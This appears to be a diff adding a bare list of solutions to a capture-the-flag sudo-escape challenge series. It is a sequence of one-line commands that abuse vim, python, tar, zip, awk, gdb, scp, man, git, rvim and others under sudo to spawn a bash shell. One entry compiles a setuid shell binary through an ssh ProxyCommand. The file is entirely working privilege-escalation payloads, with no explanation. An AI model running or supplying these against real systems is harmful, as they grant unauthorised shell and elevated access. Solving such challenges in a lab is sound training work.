@@ -1,0 +1,22 @@
+vim -c "set shell=/bin/bash" -c "sh"
+/usr/bin/sudo -u app-script-ch14-2 /usr/bin/python -c "import os;os.system('/bin/bash')"
+cd /tmp;touch 2;sudo -u app-script-ch14-3 tar -cf 2.tar 2 --checkpoint=1 --checkpoint-action=exec=/bin/bash
+touch 3;sudo -u app-script-ch14-4 zip 3.zip 3 -T -TT 'vim -c "sh"'
+sudo -u app-script-ch14-5 awk 'BEGIN {system("/bin/bash")}'
+sudo -u app-script-ch14-6 gdb -ex shell
+sudo -u app-script-ch14-7 pico -s /bin/bash
+bash
+CTRL+T
+touch 7;echo 'bash' > bash;chmod 777 bash;sudo -u app-script-ch14-8 scp -S ./bash 127.0.0.1:7 127.0.0.1:8
+sudo -u app-script-ch14-9 man cat
+!bash
+vim ssh_config
+ProxyCommand bash -c 'echo -e "int main()\n{\nsetreuid(geteuid(),geteuid());\nexecve(\"/bin/bash\",0,0);\n}" > revshell.c; gcc -o /tmp/revshell /tmp/revshell.c; chmod 4777 revshell revshell.c'
+sudo -u app-script-ch14-10 ssh -F ssh_config localhost
+./revshell
+sudo -u app-script-ch14-11 git help add
+!bash
+sudo -u app-script-ch14-12 rvim -c 'python import pty;pty.spawn("/bin/bash")'
+sudo -u app-script-ch14-13 script -c "/bin/bash"
+sudo -u app-script-ch14-14 rbash --
+
